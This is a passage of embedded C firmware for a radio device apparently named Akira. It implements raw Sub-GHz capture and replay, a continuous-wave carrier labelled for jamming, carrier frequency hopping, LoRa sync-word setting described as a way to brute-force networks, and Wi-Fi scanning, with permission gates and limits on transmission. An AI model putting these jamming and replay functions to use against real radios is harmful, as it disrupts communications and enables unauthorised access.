            n = h->ops->recv(h, s_rf_poll_buf.data, RF_RX_MAX_PACKET, 2000);
            k_mutex_unlock(&s_chip_lock);
            if (n <= 0) { k_msleep(RF_DAEMON_SLEEP_MS); continue; }
        }
        LOG_DBG("RF RX %d bytes: %02x %02x %02x %02x %02x %02x %02x %02x",
                n,
                n > 0 ? s_rf_poll_buf.data[0] : 0, n > 1 ? s_rf_poll_buf.data[1] : 0,
                n > 2 ? s_rf_poll_buf.data[2] : 0, n > 3 ? s_rf_poll_buf.data[3] : 0,
                n > 4 ? s_rf_poll_buf.data[4] : 0, n > 5 ? s_rf_poll_buf.data[5] : 0,
                n > 6 ? s_rf_poll_buf.data[6] : 0, n > 7 ? s_rf_poll_buf.data[7] : 0);
        s_rf_poll_buf.len = (uint16_t)n;
        if (k_msgq_put(&s_rf_rx_msgq, &s_rf_poll_buf, K_NO_WAIT) == -ENOMSG) {
            struct rf_rx_packet discard;
            k_msgq_get(&s_rf_rx_msgq, &discard, K_NO_WAIT);
            k_msgq_put(&s_rf_rx_msgq, &s_rf_poll_buf, K_NO_WAIT);
        }
    }
}

K_THREAD_DEFINE(rf_rx_daemon, CONFIG_AKIRA_RF_DAEMON_STACK_SIZE,
                rf_rx_daemon_fn, NULL, NULL, NULL,
                CONFIG_AKIRA_RF_DAEMON_PRIORITY, 0, 0);

int akira_rf_recv_pop(uint8_t *buf, size_t max_len, uint32_t timeout_ms)
{
    if (!buf || max_len == 0) return -EINVAL;
    /* A caller draining the RX queue is a receiver: arm continuous RX
     * (idempotent) so the daemon fills the queue and the keep-awake holds. */
    rf_rx_arm();
    struct rf_rx_packet pkt;
    k_timeout_t t = (timeout_ms == 0) ? K_NO_WAIT : K_MSEC(timeout_ms);
    int ret = k_msgq_get(&s_rf_rx_msgq, &pkt, t);
    if (ret < 0) return ret;
    size_t copy = MIN(pkt.len, max_len);
    memcpy(buf, pkt.data, copy);
    return (int)copy;
}

#else
int akira_rf_recv_pop(uint8_t *buf, size_t max_len, uint32_t timeout_ms)
{
    ARG_UNUSED(buf); ARG_UNUSED(max_len); ARG_UNUSED(timeout_ms);
    return -ENOSYS;
}
#endif /* CONFIG_AKIRA_RF_RX_DAEMON */

/* Stateless raw capture/replay: pause the daemon, take the chip, stream.
 * The lock timeout exceeds the daemon's one in-flight 2 s recv so we never
 * spuriously fail to acquire.  The daemon's previous pause state is restored
 * on every exit path — a CW carrier keyed before the capture keeps the daemon
 * parked afterwards instead of having RX yank the chip out of TX.  Callers
 * bound timeout_ms / repeat themselves (the WASM natives cap one call at
 * RF_RAW_MAX_CALL_MS): the whole call holds s_chip_lock. */
int akira_rf_raw_capture(uint8_t *buf, size_t max_bytes,
                         uint32_t sample_rate_hz, uint32_t timeout_ms)
{
    if (!buf || max_bytes == 0) return -EINVAL;

    bool was_paused = atomic_set(&s_rf_daemon_paused, 1) != 0;
    int ret = -EBUSY;
    if (k_mutex_lock(&s_chip_lock, K_MSEC(5000)) == 0) {
        radio_handle_t *h = g_active_handle;
        if (!h || !h->ops || !h->ops->raw_capture) {
            ret = -ENOSYS;
        } else if (!(h->capabilities & RADIO_CAP_RAW_MODE)) {
            ret = -ENOTSUP;
        } else {
            rf_wake_if_slept_locked(h);
            ret = h->ops->raw_capture(h, buf, max_bytes, sample_rate_hz, timeout_ms);
        }
        k_mutex_unlock(&s_chip_lock);
    }
    if (!was_paused) {
        akira_rf_daemon_resume();
    }
    return ret;
}

int akira_rf_raw_replay(const uint8_t *buf, size_t len,
                        uint32_t sample_rate_hz, uint32_t repeat)
{
    if (!buf || len == 0) return -EINVAL;

    bool was_paused = atomic_set(&s_rf_daemon_paused, 1) != 0;
    int ret = -EBUSY;
    if (k_mutex_lock(&s_chip_lock, K_MSEC(5000)) == 0) {
        radio_handle_t *h = g_active_handle;
        if (!h || !h->ops || !h->ops->raw_replay) {
            ret = -ENOSYS;
        } else if (!(h->capabilities & RADIO_CAP_RAW_MODE)) {
            ret = -ENOTSUP;
        } else {
            rf_wake_if_slept_locked(h);
            ret = h->ops->raw_replay(h, buf, len, sample_rate_hz, repeat);
        }
        k_mutex_unlock(&s_chip_lock);
    }
    if (!was_paused) {
        akira_rf_daemon_resume();
    }
    return ret;
}

/* =========================================================================
 * Continuous-wave (CW) test tone — for jamming / range testing.
 * Chip must already be selected and frequency+power configured.
 * ========================================================================= */

int akira_rf_tx_cw_start(void)
{
    LOG_INF("RF CW start");
    /* Pause the RX daemon first: otherwise its recv() loop sees rx_armed=false
     * after CW keys and re-arms RX (SetRx), yanking the chip out of TX CW —
     * jamming silently never stays on while packets keep flowing. */
    akira_rf_daemon_pause();
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
        if (!s_rf_cw_active) {
            akira_rf_daemon_resume();
        }
        return -EBUSY;
    }

    int ret = -ENODEV;
#if defined(CONFIG_AKIRA_LR2021)
    if (g_active_chip == AKIRA_RF_CHIP_LR2021) {
        rf_wake_if_slept_locked(g_active_handle);
        ret = lr2021_tx_cw_start();
    }
#endif
    /* Other chips can add their CW implementation here. */
    if (ret == 0) {
        s_rf_cw_active = true;
    }
    bool active = s_rf_cw_active;

    k_mutex_unlock(&s_chip_lock);
    if (ret < 0 && !active) {
        akira_rf_daemon_resume(); /* failed to key — restore RX */
    }
    return ret;
}

int akira_rf_tx_cw_stop(void)
{
    LOG_INF("RF CW stop");
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;

    int ret = -ENODEV;
#if defined(CONFIG_AKIRA_LR2021)
    if (g_active_chip == AKIRA_RF_CHIP_LR2021) {
        ret = lr2021_tx_cw_stop();
    }
#endif
    s_rf_cw_active = false;

    k_mutex_unlock(&s_chip_lock);

    /* Daemon was paused by start — bring RX back only now. */
    akira_rf_daemon_resume();
    return ret;
}

bool akira_rf_tx_cw_is_active(void)
{
    return s_rf_cw_active;
}

/**
 * @brief Fast frequency hop while CW is active — skips CalibFe for speed.
 *
 * Stops CW, sets new frequency (PLL lock only, no calibration),
 * restarts CW.  ~1ms vs ~20ms for a full rf_set_frequency() cycle.
 * Only valid while a carrier keyed by akira_rf_tx_cw_start() is on the air
 * (-EINVAL otherwise): a hop must never be a way to key a transmitter.
 */
int akira_rf_tx_cw_set_freq(uint32_t freq_hz)
{
    LOG_DBG("RF CW hop: %u Hz", freq_hz);
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;

    if (!s_rf_cw_active) {
        k_mutex_unlock(&s_chip_lock);
        return -EINVAL;
    }

    int ret = -ENODEV;
#if defined(CONFIG_AKIRA_LR2021)
    if (g_active_chip == AKIRA_RF_CHIP_LR2021) {
        /* Stop CW, fast-set frequency, restart CW in one atomic sequence.
         * lr2021_tx_cw_start() re-selects the PA and re-clamps the power for
         * the new band. */
        lr2021_tx_cw_stop();
        ret = lr2021_tx_cw_set_freq_fast(freq_hz);
        if (ret == 0) {
            ret = lr2021_tx_cw_start();
        }
        if (ret < 0) {
            /* Carrier is off (stopped above): say so, and the RX daemon
             * comes back once the lock is released. */
            s_rf_cw_active = false;
        }
    }
#endif
    bool dropped = !s_rf_cw_active;

    k_mutex_unlock(&s_chip_lock);
    if (dropped) {
        akira_rf_daemon_resume();
    }
    return ret;
}

/**
 * @brief Set the 8-bit LoRa sync word (LR2021 only).
 *
 * Wrong sync word → the chip's correlator never locks → no packets delivered
 * (SYNC_FAIL). Matching sync → packets land in the RX FIFO. This is the
 * discriminator a sniffer/infiltrator uses to brute-force the sync word.
 */
int akira_rf_set_sync_word(uint8_t sync)
{
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;

    int ret = -ENODEV;
#if defined(CONFIG_AKIRA_LR2021)
    if (g_active_chip == AKIRA_RF_CHIP_LR2021) {
        ret = lr2021_set_sync_word(sync);
    }
#endif

    k_mutex_unlock(&s_chip_lock);
    return ret;
}

#ifdef CONFIG_AKIRA_WASM_RUNTIME

#include <runtime/akira_runtime.h>

/* WASM Native export API
 *
 * Capabilities are self-declared in the app manifest, so they are not a
 * security boundary here: anything that keys a transmitter is Seal-gated, and
 * everything else is bounded by hard limits in this file.
 *
 * Every native that drives a chip runs inside akira_native_critical_enter/
 * exit: it holds s_chip_lock (and the SPI2 bus) while the driver works, and a
 * stop must never k_thread_abort() an app thread there — that would leak the
 * lock and the radios would be gone until reboot.  The bracketed work is
 * bounded: chip-lock waits <= 5 s, raw capture/replay <= RF_RAW_MAX_CALL_MS.
 * Waits for packets hold no lock and run in short slices instead, so a stop
 * is honoured within RF_WAIT_SLICE_MS.
 */

BUILD_ASSERT(AKIRA_MAX_WASM_INSTANCES <= 32, "RF slot bitmasks are 32-bit");

static atomic_t s_rf_app_slots;   /* bit n: slot n used the RF API         */
static atomic_t s_rf_rx_slots;    /* bit n: slot n armed continuous RX     */
static int s_rf_cw_slot = -1;     /* slot that keyed CW (-1: none / shell) */
static int s_rf_raw_slot = -1;    /* slot inside a raw capture/replay      */

#define RF_WAIT_SLICE_MS          100
#define RF_WAIT_MAX_MS            60000u
#define RF_TX_MAX_BYTES           RF_RX_MAX_PACKET
#define RF_RAW_MAX_BYTES          8192u
#define RF_RAW_MAX_CALL_MS        2000u  /* one capture/replay call, all repeats */
#define RF_RAW_REPEAT_OVERHEAD_MS 15u    /* driver's 10 ms inter-repeat gap + strobes */
#define RF_RAW_MIN_RATE_HZ        1000u
#define RF_RAW_MAX_RATE_HZ        500000u

/* Run a chip-touching call so that a stop cannot abort the app mid-call. */
#define RF_CRITICAL(env, expr)                  \
    ({                                          \
        akira_native_critical_enter(env);       \
        int rf_crit_ret_ = (expr);              \
        akira_native_critical_exit(env);        \
        rf_crit_ret_;                           \
    })

static int rf_note_slot(wasm_exec_env_t exec_env)
{
    int slot = akira_runtime_slot_of_exec_env(exec_env);

    if (slot >= 0 && slot < AKIRA_MAX_WASM_INSTANCES) {
        atomic_set_bit(&s_rf_app_slots, slot);
    }
    return slot;
}

/* This app wants packets: arm continuous RX and remember who asked. */
static void rf_note_rx(wasm_exec_env_t exec_env)
{
    int slot = rf_note_slot(exec_env);

    if (slot >= 0 && slot < AKIRA_MAX_WASM_INSTANCES) {
        atomic_set_bit(&s_rf_rx_slots, slot);
    }
    rf_rx_arm();
}

/* Translate + range-check an app buffer.  A bare integer offset (the "(iii)"
 * recv signatures) is unchecked by WAMR, and '*' only covers one byte. */
static uint8_t *rf_app_buf(wasm_exec_env_t exec_env, uint32_t app_ptr, uint32_t len)
{
    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);

    if (!inst || len == 0 ||
        !wasm_runtime_validate_app_addr(inst, (uint64_t)app_ptr, (uint64_t)len)) {
        return NULL;
    }
    return (uint8_t *)wasm_runtime_addr_app_to_native(inst, (uint64_t)app_ptr);
}

/* Pop one packet, waiting at most timeout_ms (capped at RF_WAIT_MAX_MS) in
 * RF_WAIT_SLICE_MS slices so a stop is honoured promptly.
 * 0 = packet; -ENOMSG = empty (timeout 0); -EAGAIN = timed out;
 * -ECANCELED = the app is being stopped. */
static int rf_pop_sliced(wasm_exec_env_t exec_env, struct rf_rx_packet *pkt,
                         uint32_t timeout_ms)
{
    uint32_t left = MIN(timeout_ms, RF_WAIT_MAX_MS);

    for (;;) {
        uint32_t slice = MIN(left, (uint32_t)RF_WAIT_SLICE_MS);
        int ret = k_msgq_get(&s_rf_rx_msgq, pkt, slice ? K_MSEC(slice) : K_NO_WAIT);

        if (ret == 0 || slice == 0) {
            return ret;
        }
        left -= slice;
        if (akira_runtime_stop_requested(exec_env)) {
            return -ECANCELED;
        }
        if (left == 0) {
            return -EAGAIN;
        }
    }
}

void akira_rf_api_release(int slot)
{
    if (slot < 0 || slot >= AKIRA_MAX_WASM_INSTANCES) {
        return;
    }

    bool used  = atomic_test_and_clear_bit(&s_rf_app_slots, slot);
    bool armed = atomic_test_and_clear_bit(&s_rf_rx_slots, slot);
    bool cw    = (s_rf_cw_slot == slot);
    bool raw   = (s_rf_raw_slot == slot);

    if (!used && !armed && !cw && !raw) {
        return;  /* never touched the RF API: leave the shell's radio alone */
    }

    if (raw) {
        /* The thread died inside a raw capture/replay (a fault: a stop never
         * aborts inside the critical section).  The daemon was left paused. */
        s_rf_raw_slot = -1;
        akira_rf_daemon_resume();
    }
    if (cw) {
        s_rf_cw_slot = -1;
        (void)akira_rf_tx_cw_stop();   /* un-key + resume the RX daemon */
    }
    akira_rf_rx_disarm();
    akira_rf_rx_purge();
    (void)akira_rf_sleep_if_idle();
    /* Drops ownership (so the mesh can take a chip) and un-keys any carrier
     * still on the active radio. */
    (void)akira_rf_release_all();
    LOG_INF("RF: released resources of app slot %d", slot);
}

int akira_native_rf_select(wasm_exec_env_t exec_env, int chip)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, akira_rf_select((akira_rf_chip_t)chip));
}

int akira_native_rf_recv_pop(wasm_exec_env_t exec_env, uint32_t buf_ptr,
                             uint32_t max_len, uint32_t timeout_ms)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (max_len == 0) {
        return -EINVAL;
    }
#ifdef CONFIG_AKIRA_RF_RX_DAEMON
    /* A packet is at most RF_RX_MAX_PACKET bytes: validate exactly the span
     * that can be written. */
    uint32_t span = MIN(max_len, (uint32_t)RF_RX_MAX_PACKET);
    uint8_t *buf = rf_app_buf(exec_env, buf_ptr, span);
    if (!buf) {
        return -EFAULT;
    }

    rf_note_rx(exec_env);
    struct rf_rx_packet pkt;
    int ret = rf_pop_sliced(exec_env, &pkt, timeout_ms);
    if (ret < 0) {
        return ret;
    }
    size_t copy = MIN((size_t)pkt.len, (size_t)span);
    memcpy(buf, pkt.data, copy);
    return (int)copy;
#else
    ARG_UNUSED(buf_ptr);
    ARG_UNUSED(timeout_ms);
    return -ENOSYS;
#endif
}

/* Registered "(ii)i" (v1.7.x ABI): payload_ptr is a raw app offset that WAMR
 * does not validate, so rf_app_buf() range-checks base+len before any read. */
int akira_native_rf_send(wasm_exec_env_t exec_env, uint32_t payload_ptr, uint32_t len)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (len == 0 || len > RF_TX_MAX_BYTES) {
        return -EINVAL;
    }
    uint8_t *buf = rf_app_buf(exec_env, payload_ptr, len);
    if (!buf) {
        return -EFAULT;
    }

    AKIRA_SEAL_GATE_OR_RETURN(exec_env, AKIRA_SEAL_RF_TX, NULL, -EACCES);
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, akira_rf_send(buf, len));
}

int akira_native_rf_receive(wasm_exec_env_t exec_env, uint32_t buffer_ptr,
                             uint32_t max_len, uint32_t timeout_ms)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (max_len == 0) {
        return -EINVAL;
    }
    uint32_t span = MIN(max_len, (uint32_t)RF_RX_MAX_PACKET);
    uint8_t *buf = rf_app_buf(exec_env, buffer_ptr, span);
    if (!buf) {
        return -EFAULT;
    }

    rf_note_rx(exec_env);
    struct rf_rx_packet pkt;
    int ret = rf_pop_sliced(exec_env, &pkt, timeout_ms);
    if (ret == -ECANCELED) {
        return ret;
    }
    if (ret < 0) {
        return 0;  /* timeout, no packet (historical rf_receive contract) */
    }
    size_t copy = MIN((size_t)pkt.len, (size_t)span);
    memcpy(buf, pkt.data, copy);
    return (int)copy;
}

int akira_native_rf_set_frequency(wasm_exec_env_t exec_env, uint32_t freq_hz)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, akira_rf_set_frequency(freq_hz));
}

int akira_native_rf_set_modulation(wasm_exec_env_t exec_env, int mod)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, akira_rf_set_modulation((radio_modulation_t)mod));
}

/* SF/BW never fall back to the mesh's LR2021: -EBUSY unless this API has a
 * radio selected (rf_select). */
int akira_native_rf_set_spreading_factor(wasm_exec_env_t exec_env, int sf)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    if (sf < 6 || sf > 12) return -EINVAL;
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, rf_set_sf_impl((uint8_t)sf, false));
}

int akira_native_rf_set_bandwidth(wasm_exec_env_t exec_env, uint32_t bw_hz)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, rf_set_bw_impl(bw_hz, false));
}

int akira_native_rf_set_coding_rate(wasm_exec_env_t exec_env, int cr)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    if (cr < 5 || cr > 8) return -EINVAL;
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, akira_rf_set_coding_rate((uint8_t)cr));
}

int akira_native_rf_get_rssi(wasm_exec_env_t exec_env)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    int16_t rssi = 0;
    int ret = RF_CRITICAL(exec_env, akira_rf_get_rssi(&rssi));
    if (ret < 0) {
        return ret;
    }
    return (int32_t)rssi;
}

int akira_native_rf_set_power(wasm_exec_env_t exec_env, int8_t dbm)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    rf_note_slot(exec_env);
    /* The driver clamps to the PA's limits for the current band. */
    return RF_CRITICAL(exec_env, akira_rf_set_power(dbm));
}

int akira_native_rf_set_bitrate(wasm_exec_env_t exec_env, int32_t bps)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    if (bps <= 0) return -EINVAL;
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, akira_rf_set_bitrate((uint32_t)bps));
}

/* ── Continuous-wave TX (CW) for jamming / range testing ──────────────── */

int akira_native_rf_tx_cw_start(wasm_exec_env_t exec_env)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    AKIRA_SEAL_GATE_OR_RETURN(exec_env, AKIRA_SEAL_RF_TX, NULL, -EACCES);
    int slot = rf_note_slot(exec_env);
    int ret = RF_CRITICAL(exec_env, akira_rf_tx_cw_start());
    if (ret == 0) {
        s_rf_cw_slot = slot;  /* app teardown un-keys it if the app doesn't */
    }
    return ret;
}

int akira_native_rf_tx_cw_stop(wasm_exec_env_t exec_env)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    int ret = RF_CRITICAL(exec_env, akira_rf_tx_cw_stop());
    s_rf_cw_slot = -1;
    return ret;
}

/* Fast frequency hop while CW is active. Type: "(i)i".  Re-keys a carrier,
 * so it is Seal-gated like rf_tx_cw_start, and only hops a carrier that is
 * already on the air (-EINVAL otherwise). */
int akira_native_rf_tx_cw_set_freq(wasm_exec_env_t exec_env, uint32_t freq_hz)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    AKIRA_SEAL_GATE_OR_RETURN(exec_env, AKIRA_SEAL_RF_TX, NULL, -EACCES);
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, akira_rf_tx_cw_set_freq(freq_hz));
}

/* Set LoRa sync word (8-bit). Type: "(i)i" */
int akira_native_rf_set_sync_word(wasm_exec_env_t exec_env, uint32_t sync)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);
    if (sync > 0xFF) return -EINVAL;
    rf_note_slot(exec_env);
    return RF_CRITICAL(exec_env, akira_rf_set_sync_word((uint8_t)sync));
}

/* ── Raw Sub-GHz OOK capture / replay ──────────────────────────────────── */

/* One call owns the chip (daemon paused, s_chip_lock held, driver busy-
 * waiting) for its whole duration, so it is capped at RF_RAW_MAX_CALL_MS:
 * longer captures are made of several calls. */
int akira_native_rf_raw_capture(wasm_exec_env_t exec_env,
                                 uint32_t buf_wasm, uint32_t max_bytes,
                                 uint32_t sample_rate_hz, int32_t timeout_ms)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (max_bytes == 0 || max_bytes > RF_RAW_MAX_BYTES) return -EINVAL;
    if (sample_rate_hz < RF_RAW_MIN_RATE_HZ || sample_rate_hz > RF_RAW_MAX_RATE_HZ) {
        return -EINVAL;
    }
    if (timeout_ms <= 0 || (uint32_t)timeout_ms > RF_RAW_MAX_CALL_MS) {
        timeout_ms = (int32_t)RF_RAW_MAX_CALL_MS;
    }

    uint8_t *buf = rf_app_buf(exec_env, buf_wasm, max_bytes);
    if (!buf) {
        return -EFAULT;
    }

    s_rf_raw_slot = rf_note_slot(exec_env);
    int ret = RF_CRITICAL(exec_env, akira_rf_raw_capture(buf, max_bytes, sample_rate_hz,
                                                         (uint32_t)timeout_ms));
    s_rf_raw_slot = -1;
    return ret;
}

int akira_native_rf_raw_replay(wasm_exec_env_t exec_env,
                                uint32_t buf_wasm, uint32_t len,
                                uint32_t sample_rate_hz, int32_t repeat)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (len == 0 || len > RF_RAW_MAX_BYTES) return -EINVAL;
    if (sample_rate_hz < RF_RAW_MIN_RATE_HZ || sample_rate_hz > RF_RAW_MAX_RATE_HZ) {
        return -EINVAL;
    }
    if (repeat < 1) repeat = 1;

    /* Air time of one pass (8 samples/byte) plus the driver's per-repeat
     * overhead; the whole call (all repeats) must fit RF_RAW_MAX_CALL_MS. */
    uint32_t pass_ms = (uint32_t)DIV_ROUND_UP((uint64_t)len * 8u * 1000u, sample_rate_hz) +
                       RF_RAW_REPEAT_OVERHEAD_MS;
    if (pass_ms > RF_RAW_MAX_CALL_MS) {
        return -E2BIG;
    }
    uint32_t max_repeat = RF_RAW_MAX_CALL_MS / pass_ms;
    if ((uint32_t)repeat > max_repeat) {
        repeat = (int32_t)max_repeat;
    }

    const uint8_t *buf = rf_app_buf(exec_env, buf_wasm, len);
    if (!buf) {
        return -EFAULT;
    }

    AKIRA_SEAL_GATE_OR_RETURN(exec_env, AKIRA_SEAL_RF_TX, NULL, -EACCES);

    s_rf_raw_slot = rf_note_slot(exec_env);
    int ret = RF_CRITICAL(exec_env, akira_rf_raw_replay(buf, len, sample_rate_hz,
                                                        (uint32_t)repeat));
    s_rf_raw_slot = -1;
    return ret;
}

#if defined(CONFIG_WIFI) && defined(CONFIG_AKIRA_RF_FRAMEWORK)

/* ── Spectrum scan (per-channel max RSSI) ────────────────────────────── */
#define WIFI_SCAN_MAX_CHANNELS 14
#define WIFI_SCAN_TIMEOUT_MS   5000

struct wifi_scan_ctx {
    int8_t  rssi[WIFI_SCAN_MAX_CHANNELS];
    uint8_t seen[WIFI_SCAN_MAX_CHANNELS];
    struct k_sem done;
};

static struct wifi_scan_ctx g_wifi_scan_ctx;
static struct net_mgmt_event_callback g_wifi_scan_cb;
static bool g_wifi_scan_cb_reg;

static void wifi_scan_event_handler(struct net_mgmt_event_callback *cb,
                                     uint64_t event, struct net_if *iface)
{
    ARG_UNUSED(cb);
    ARG_UNUSED(iface);

    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
        const struct wifi_scan_result *entry =
            (const struct wifi_scan_result *)cb->info;
        if (entry && entry->channel >= 1 &&
            entry->channel <= WIFI_SCAN_MAX_CHANNELS) {
            int ch = entry->channel - 1;
            if (!g_wifi_scan_ctx.seen[ch] ||
                entry->rssi > g_wifi_scan_ctx.rssi[ch]) {
                g_wifi_scan_ctx.rssi[ch] = entry->rssi;
                g_wifi_scan_ctx.seen[ch] = 1;
            }
        }
    } else if (event == NET_EVENT_WIFI_SCAN_DONE) {
        k_sem_give(&g_wifi_scan_ctx.done);
    }
}

int akira_native_wifi_scan_rssi(wasm_exec_env_t exec_env,
                                 uint32_t buf_ptr, uint32_t buf_len)
{
    wasm_module_inst_t module_inst = wasm_runtime_get_module_inst(exec_env);
    if (!module_inst) {
        return -1;
    }

    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_RF_TRANSCEIVE, -EPERM);

    if (buf_len < WIFI_SCAN_MAX_CHANNELS) {
        return -EINVAL;
    }

    int8_t *dst = (int8_t *)akira_wasm_ptr_to_native(exec_env, buf_ptr, WIFI_SCAN_MAX_CHANNELS);
    if (!dst) {
        return -EFAULT;
    }

    struct net_if *iface = net_if_get_wifi_sta();
    if (!iface) {
        LOG_ERR("wifi_scan_rssi: no STA interface");
        return -ENODEV;
    }

    (void)memset(g_wifi_scan_ctx.rssi, RADIO_RSSI_UNAVAILABLE,
                 sizeof(g_wifi_scan_ctx.rssi));
    (void)memset(g_wifi_scan_ctx.seen, 0, sizeof(g_wifi_scan_ctx.seen));
    k_sem_init(&g_wifi_scan_ctx.done, 0, 1);

    if (!g_wifi_scan_cb_reg) {
        net_mgmt_init_event_callback(&g_wifi_scan_cb,
                                     wifi_scan_event_handler,
                                     NET_EVENT_WIFI_SCAN_RESULT |
                                     NET_EVENT_WIFI_SCAN_DONE);
        net_mgmt_add_event_callback(&g_wifi_scan_cb);
        g_wifi_scan_cb_reg = true;
    }

    LOG_INF("Starting WiFi scan for spectrum analysis");

    int ret = net_mgmt(NET_REQUEST_WIFI_SCAN, iface, NULL, 0);
    if (ret) {
        LOG_ERR("WiFi scan request failed: %d", ret);
        return ret;
    }

    ret = k_sem_take(&g_wifi_scan_ctx.done, K_MSEC(WIFI_SCAN_TIMEOUT_MS));
    if (ret) {
        LOG_WRN("WiFi scan timed out, returning partial results");
    }

    for (int i = 0; i < WIFI_SCAN_MAX_CHANNELS; i++) {
        dst[i] = g_wifi_scan_ctx.rssi[i];
    }

    return WIFI_SCAN_MAX_CHANNELS;
}

/* ── AP scan (full wifi_scan_result records) ─────────────────────────── */

#define WIFI_APS_MAX          64
#define WIFI_AP_ENTRY_SIZE    48    /* sizeof(akira_wifi_ap_t) — must match SDK */
#define WIFI_APS_TIMEOUT_MS   8000

/*
 * Wire struct — layout MUST stay in sync with akira_wifi_ap_t in akira_api.h.
 * Natural alignment gives 48 bytes; verified with BUILD_ASSERT below.
 */
struct wifi_ap_wire {
    uint8_t  ssid[33];      /* +0  null-terminated SSID */
    uint8_t  bssid[6];      /* +33 BSSID (MAC) */
    uint8_t  channel;       /* +39 2.4 GHz channel 1-14 */
    int8_t   rssi;          /* +40 signal strength dBm */
    uint8_t  security;      /* +41 0=open 1=WEP 2=WPA 3=WPA2 4=WPA3 5=ENT */
    uint8_t  _pad[2];       /* +42 align last_seen_ms to 4-byte boundary */
    uint32_t last_seen_ms;  /* +44 k_uptime_get_32() when last seen */
};                          /* total 48 */
BUILD_ASSERT(sizeof(struct wifi_ap_wire) == WIFI_AP_ENTRY_SIZE,
             "wifi_ap_wire / akira_wifi_ap_t size mismatch");

static struct wifi_ap_wire              g_aps_buf[WIFI_APS_MAX] AKIRA_BULK_BSS;
static int                              g_aps_count;
static struct k_sem                     g_aps_sem;
static struct net_mgmt_event_callback   g_aps_cb;
static bool                             g_aps_cb_reg;

static uint8_t ap_map_security(enum wifi_security_type s)
{
    switch (s) {
    case WIFI_SECURITY_TYPE_NONE:            return 0;
    case WIFI_SECURITY_TYPE_WEP:             return 1;
    case WIFI_SECURITY_TYPE_WPA_PSK:         return 2;
    case WIFI_SECURITY_TYPE_PSK:
    case WIFI_SECURITY_TYPE_PSK_SHA256:
    case WIFI_SECURITY_TYPE_WPA_AUTO_PERSONAL:
    case WIFI_SECURITY_TYPE_FT_PSK:          return 3; /* WPA2 */
    case WIFI_SECURITY_TYPE_SAE:
    case WIFI_SECURITY_TYPE_SAE_H2E:
    case WIFI_SECURITY_TYPE_SAE_AUTO:
    case WIFI_SECURITY_TYPE_FT_SAE:
    case WIFI_SECURITY_TYPE_SAE_EXT_KEY:     return 4; /* WPA3 */
    default:                                 return 5; /* Enterprise / unknown */
    }
}

static void wifi_aps_event_handler(struct net_mgmt_event_callback *cb,
                                    uint64_t event, struct net_if *iface)
{
    ARG_UNUSED(iface);

    if (event == NET_EVENT_WIFI_SCAN_RESULT) {
        if (g_aps_count >= WIFI_APS_MAX) return;
        const struct wifi_scan_result *e =
            (const struct wifi_scan_result *)cb->info;
        if (!e) return;

        /* Deduplicate by BSSID; update RSSI if this reading is stronger */
        for (int i = 0; i < g_aps_count; i++) {
            if (memcmp(g_aps_buf[i].bssid, e->mac, 6) == 0) {
                if (e->rssi > g_aps_buf[i].rssi)
                    g_aps_buf[i].rssi = e->rssi;
                g_aps_buf[i].last_seen_ms = k_uptime_get_32();
                return;
            }
        }

        struct wifi_ap_wire *ap = &g_aps_buf[g_aps_count++];
        uint8_t slen = e->ssid_length < 32u ? e->ssid_length : 32u;
        memcpy(ap->ssid, e->ssid, slen);
        ap->ssid[slen]   = '\0';
        memcpy(ap->bssid, e->mac, 6);
